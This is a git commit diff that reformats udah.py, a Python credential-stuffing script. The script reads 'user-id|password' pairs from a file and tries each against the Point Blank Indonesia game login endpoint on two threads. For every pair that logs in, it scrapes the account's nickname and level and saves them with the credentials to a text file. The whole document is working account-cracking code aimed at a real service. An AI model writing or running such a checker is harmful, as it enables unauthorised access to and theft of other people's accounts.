ef53ee7485f6a885f62e59f93f071c36ee7959a8
uzioooioioio <111040853+uzioooioioio@users.noreply.github.com>
2023-05-30 11:48:53 +0700

    Update udah.py

--- udah.py
+++ udah.py
@@ -1,50 +1,51 @@
-import requests, os, sys
-from multiprocessing.pool import ThreadPool 
-from bs4 import BeautifulSoup 
- 
+import requests
+import os
+import sys
+from multiprocessing.pool import ThreadPool
+from bs4 import BeautifulSoup
 
-login_url = "https://www.pointblank.id/login/process" 
+
+login_url = "https://www.pointblank.id/login/process"
 repos_url = "https://www.pointblank.id/game/profile"
- 
-with requests.session() as s: 	
+
+with requests.session() as s:
     def cek(up):
-            try:
-                res=s.post('https://www.pointblank.id/login/process',data={'loginFail':'0','userid':up.split('|')[0],'password':up.split('|')[1]})
-                if 'tidak sesuai' in res.text:
-                    print(up,'salah')
+        try:
+            res = s.post(login_url, data={'loginFail': '0', 'userid': up.split('|')[0], 'password': up.split('|')[1]})
+            if 'tidak sesuai' in res.text:
+                print(up, 'salah')
+            else:
+                r = s.get(repos_url)
+                soup = BeautifulSoup(r.content, "html.parser")
+                repos = soup.find("p", class_="level")
+                print(up, 'benar')
+                usernameDiv = soup.find("div", class_="nick")
+                print("Username: " + usernameDiv.getText())
+                username = usernameDiv.getText()
+                repos = soup.find("p", class_="level")
+                print("Level: " + repos.getText())
+                reposs = repos.getText()
+                if repos is None:
+                    print("Akun belum diaktifkan")
+                    print(repos)
+                    s.close()
                 else:
-                    r = s.get(repos_url)
-                    soup = BeautifulSoup (r.content, "html.parser")
-                    repos = soup.find("p", class_="level")
-                    print(up,'benar')
-                    usernameDiv = soup.find("div", class_="nick")
-                    print("Username: " + usernameDiv.getText())
-                    username = usernameDiv.getText()
-                    repos = soup.find("p", class_="level")
-                    print("Username: " + repos.getText())
-                    reposs=repos.getText()
-                    if repos is None:
-                          print("akun belum di aktifkan")
-                          print(repos)
-
-                          s.session.close()
-                    else:
-                          open('bang2.txt','a+').write(up+'|'+reposs+'|'+ username+'\n')
-                          s.session.close()
-
-            except:
-                pass
+                    with open('mauljancok.txt', 'a+', encoding='utf-8') as f:
+                        f.write(up + '|' + reposs + '|' + username + '\n')
+                    s.close()
+        except:
+            pass
 
 try:
-	os.system('clear')
+    os.system('clear')
 
-	ThreadPool(2).map(cek,open(sys.argv[1]).read().splitlines())
-	print ("Hello, World!")
+    ThreadPool(2).map(cek, open(sys.argv[1], encoding='utf-8').read().splitlines())
+    print("Hello, World!")
 except requests.exceptions.ConnectionError:
-	exit('%s[%s!%s] %sCheck internet')
+    exit('[!] Check internet')
 except IndexError:
-	exit('%s[%s!%s] %sUse : python2 %s target.txt \n%s[%s!%s] %sFill in target.txt as follows user-id|password'%(W1,R1,W1,W0,sys.argv[0],W1,R1,W1,W0))
+    exit('[!] Use: python2 {} target.txt\n[!] Fill in target.txt as follows user-id|password'.format(sys.argv[0]))
 except IOError:
-	exit('%s[%s!%s] %sFile does not exist')
+    exit('[!] File does not exist')
 except KeyboardInterrupt:
-	exit('\n%s[%s!%s] %sExit'%())
+    exit('\n[!] Exit')
